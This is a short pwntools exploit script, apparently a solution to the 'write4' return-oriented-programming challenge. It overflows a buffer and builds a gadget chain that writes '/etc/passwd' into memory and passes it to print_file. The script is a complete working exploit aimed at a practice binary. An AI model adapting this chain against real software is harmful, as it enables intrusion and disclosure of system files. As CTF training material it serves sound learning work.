#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('write4')


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


gdbscript = '''
b *pwnme+152
continue
'''.format(**locals())

ret = 0x4004e6
bss = 0x601038
pop_rdi = 0x400693
pop_r14_r15 = 0x400690
mov_r14_r15 = 0x400628
print_file = 0x400510

_filename = b'/etc/passwd'
pay = b'A' * 40
pay += p64(ret)
pay += p64(pop_r14_r15)
pay += p64(bss)
pay += _filename[:8]
pay += p64(mov_r14_r15)
pay += p64(pop_r14_r15)
pay += p64(bss + 0x8)
pay += _filename[8:] + b'\x00' * (16 - len(_filename))
pay += p64(mov_r14_r15)
pay += p64(pop_rdi)
pay += p64(bss)

pay += p64(print_file)

io = start()

io.clean()
io.sendline(pay)
io.interactive()
